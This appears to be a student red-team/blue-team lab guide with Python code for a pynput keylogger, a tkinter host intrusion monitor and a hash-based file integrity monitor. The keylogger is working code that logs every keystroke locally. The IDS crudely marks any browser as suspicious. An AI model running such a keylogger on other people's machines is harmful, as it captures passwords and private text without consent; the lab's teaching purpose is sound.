# RED-BLUE

### Step 1: Make a new folder (in downloads folder) and name it SecLab

Ctrl + Shift + p Type: Phyton: Select Interpreter

  Install Required Python Module:
```bash
pip install pynput
```

### Keylogger.py
```bash

from pynput import keyboard
import os
import logging
from datetime import datetime

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture key strokes
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

To run:

```bash
cd Keylogger
python keylogger.py
```

##CREATE NEW FOLDER "HIDS"

Type in terminal:
```bash
pip install psutil
```

hids.py
```bash
import psutil
import os
import time
from datetime import datetime
import threading
import tkinter as tk
from tkinter import messagebox, ttk

log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
hids_log = os.path.join(log_dir, "hids_log.txt")

known_browsers = ["chrome", "firefox", "msedge", "iexplore", "opera", "brave", "safari"]
known_apps = known_browsers + ["word", "excel", "powerpoint", "notepad", "photoshop", "teams", "zoom", "vlc"]
seen_pids = set()

class HIDSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Modern Host-Based IDS Monitor")
        self.root.geometry("950x400")
        style = ttk.Style(self.root)
        style.theme_use("clam")

        title = tk.Label(root, text="Real-Time HIDS Dashboard", font=("Segoe UI", 20, "bold"), fg="#2e7d32")
        title.pack(pady=10)

        self.tree = ttk.Treeview(root, 
                         columns=("Time", "Process", "PID", "Status", "CMD"), 
                         show="headings", height=16)
        self.tree.pack(fill=tk.BOTH, expand=True)
        for col in self.tree["columns"]:
            self.tree.heading(col, text=col)
            self.tree.column(col, anchor=tk.CENTER)
        self.tree.column("Time", width=130)
        self.tree.column("Process", width=160)
        self.tree.column("PID", width=70)
        self.tree.column("Status", width=100)
        self.tree.column("CMD", width=300)

        self.running = True
        threading.Thread(target=self.monitor_thread, daemon=True).start()

    def monitor_thread(self):
        while self.running:
            alert_queue = []
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
                try:
                    name = (proc.info['name'] or "").lower()
                    pid = proc.info['pid']
                    cmd = " ".join(proc.info.get('cmdline') or [])
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    status = "NORMAL"
                    color = "#2e7d32"
                    alert = False

                    # Only show new events
                    if pid not in seen_pids:
                        if any(app in name for app in known_apps):
                            status = "SUSPICIOUS" if any(b in name for b in known_browsers) else "MONITORED APP"
                            color = "#c62828" if status == "SUSPICIOUS" else "#1565c0"
                            alert = True
                            with open(hids_log, "a") as f:
                                f.write(f"{datetime.now()}: {name} ({pid}) {status} CMD: {cmd}\n")

                            self.tree.insert("", 0, values=(timestamp, name, pid, status, cmd), tags=("alert",))
                            self.tree.tag_configure("alert", foreground=color)
                            if alert:
                                alert_queue.append((name, pid, status))
                        else:
                            self.tree.insert("", 0, values=(timestamp, name, pid, status, cmd), tags=("normal",))
                            self.tree.tag_configure("normal", foreground=color)
                        seen_pids.add(pid)
                except Exception:
                    continue

            # Pop-up any alerts on the main thread
            for name, pid, status in alert_queue:
                self.root.after(0, self.show_popup, name, pid, status)

            time.sleep(1)

    def show_popup(self, name, pid, status):
        # Popup for suspicious process/app on main thread
        messagebox.showwarning(
            "HIDS ALERT!",
            f"Detected:\nProcess: {name}\nPID: {pid}\nStatus: {status}"
        )

    def on_close(self):
        self.running = False
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = HIDSApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()


```

SECLab/
└── FIM/
    ├── fim.py
    ├── logs/
    │   ├── fim_alerts.txt
    │   └── fim_hashes.txt
    └── protected_files/
        ├── config.txt
        └── notes.txt

### CREATE logs, protected_Files folder

## Fim.py

```bash
import os, hashlib, time
from datetime import datetime

MONITOR_DIR = "protected_files"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(MONITOR_DIR, exist_ok=True)

def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB): return {}
    with open(HASH_DB) as f:
        return dict(line.strip().split(" || ") for line in f)

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(msg):
    with open(ALERT_LOG, 'a') as f:
        f.write(f"[{datetime.now()}] {msg}\n")
    print(f"[ALERT] {msg}")

while True:
    previous_hashes = load_hashes()
    current_hashes = {}

    for root, _, files in os.walk(MONITOR_DIR):
        for file in files:
            path = os.path.join(root, file)
            h = get_hash(path)
            if h:
                current_hashes[path] = h

    for path in previous_hashes:
        if path not in current_hashes:
            log_alert(f"Deleted: {path}")
        elif current_hashes[path] != previous_hashes[path]:
            log_alert(f"Modified: {path}")

    for path in current_hashes:
        if path not in previous_hashes:
            log_alert(f"New file added: {path}")

    save_hashes(current_hashes)
    time.sleep(5)
```

To run:
```bash
python fim.py
```

#### then create any txt file in the protected files, see the changes in fim_alerts.


